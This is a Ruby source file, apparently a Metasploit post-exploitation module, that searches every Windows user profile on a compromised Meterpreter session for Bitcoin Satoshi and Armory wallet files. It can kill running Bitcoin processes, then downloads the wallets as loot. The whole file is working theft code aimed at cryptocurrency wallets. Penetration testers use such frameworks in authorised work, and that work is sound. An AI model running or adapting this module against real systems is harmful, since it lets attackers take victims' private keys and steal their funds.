##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Bitcoin Wallet',
      'Description'   => %q{
        This module downloads any Bitcoin wallet files from the target
        system. It currently supports both the classic Satoshi wallet and the
        more recent Armory wallets. Note that Satoshi wallets tend to be
        unencrypted by default, while Armory wallets tend to be encrypted by default.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
        'illwill <illwill[at]illmob.org>', # Original implementation
        'todb', # Added Armory support
      ],
      'Platform'      => [ 'win' ], # TODO: Several more platforms host Bitcoin wallets...
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options([
      OptBool.new('KILL_PROCESSES', [false, 'Kill associated Bitcoin processes before jacking.', false]),
    ], self.class)
  end

  def run
    print_status("Checking all user profiles for Bitcoin wallets...")
    found_wallets = false
    grab_user_profiles().each do |user|
      next unless user['AppData']
      bitcoin_wallet_path = user['AppData'] + "\\Bitcoin\\wallet.dat"
      next unless file?(bitcoin_wallet_path)
      found_wallets = true
      jack_wallet(bitcoin_wallet_path)
      armory_wallet_path = user['AppData'] + "\\Armory"
      session.fs.dir.foreach(armory_wallet_path) do |fname|
        next unless fname =~ /\.wallet/
        found_wallets = true
        armory_wallet_fullpath = armory_wallet_path + "\\#{fname}"
        jack_wallet(armory_wallet_fullpath)
      end
    end
    unless found_wallets
      print_warning "No wallets found, nothing to do."
    end
  end

  def jack_wallet(wallet_path)
    data = ""
    wallet_type = case wallet_path
                  when /\.wallet$/
                    :armory
                  when /wallet\.dat$/
                    :satoshi
                  else
                    :unknown
                  end

    if wallet_type == :unknown
      print_error "Unknown wallet type: #{wallet_path}, nothing to do."
      return
    end

    print_status("#{wallet_type.to_s.capitalize} Wallet found at #{wallet_path}")
    print_status("Jackin' wallet...")

    kill_bitcoin_processes if datastore['KILL_PROCESSES']

    begin
      data = read_file(wallet_path) || ''
    rescue ::Exception => e
      print_error("Failed to download #{wallet_path}: #{e.class} #{e}")
      return
    end

    if data.empty?
      print_error("No data found, nothing to save.")
    else
      loot_result = store_loot(
        "bitcoin.wallet.#{wallet_type}",
        "application/octet-stream",
        session,
        data,
        wallet_path,
        "Bitcoin Wallet (#{wallet_type.to_s.capitalize})"
      )
      print_status("Wallet jacked: #{loot_result}")
    end
  end

  def kill_bitcoin_processes
    client.sys.process.get_processes().each do |process|
      pname = process['name'].downcase
      if pname == "bitcoin.exe" || pname == "bitcoind.exe" || pname == "armoryqt.exe"
        print_status("#{process['name']} Process Found...")
        print_status("Killing Process ID #{process['pid']}...")
        session.sys.process.kill(process['pid'])
      end
    end
  end

end
